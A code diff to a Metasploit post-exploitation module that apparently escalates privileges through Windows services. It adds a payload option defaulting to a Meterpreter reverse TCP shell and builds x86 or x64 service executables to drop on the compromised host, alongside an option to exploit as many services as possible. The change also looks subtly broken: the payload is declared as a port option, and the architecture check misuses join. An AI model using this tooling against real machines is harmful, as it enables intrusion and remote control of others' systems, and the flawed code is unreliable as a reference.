@@ -40,6 +40,7 @@ class Metasploit3 < Msf::Post
 		register_options([
 			OptAddress.new("LHOST",   [ false, "Listener IP address for the new session" ]),
 			OptPort.new("LPORT",      [ false, "Listener port for the new session", 4444 ]),
+			OptPort.new("PAYLOAD",      [ false, "Windows Payload to use.", "windows/meterpreter/reverse_tcp" ]),
 			OptBool.new("AGGRESSIVE",      [ false, "Exploit as many services as possible (dangerous)", false ])
 		])
 
@@ -86,7 +87,11 @@ class Metasploit3 < Msf::Post
 
 		raw = pay.generate
 
-		exe = Msf::Util::EXE.to_win32pe(session.framework, raw)
+		if pay.arch.join /x86/
+			exe = Msf::Util::EXE.to_win32pe_service(session.framework, raw)
+		else
+			exe = Msf::Util::EXE.to_win64pe_service(session.framework, raw)
+		end
 
 		sysdir = session.fs.file.expand_path("%SystemRoot%")
 		tmpdir = session.fs.file.expand_path("%TEMP%")
